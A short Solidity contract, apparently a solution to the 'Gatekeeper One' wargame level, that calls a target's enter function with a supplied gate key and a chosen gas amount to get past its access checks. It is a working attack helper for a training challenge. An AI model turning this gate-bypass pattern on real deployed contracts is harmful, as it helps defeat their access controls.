// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttacker {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack(bytes8 _gateKey, uint256 gasOffset) public {
        (bool success, ) = target.call{gas: gasOffset}(
            abi.encodeWithSignature("enter(bytes8)", _gateKey)
        );
        require(success, "Attack failed");
    }
}
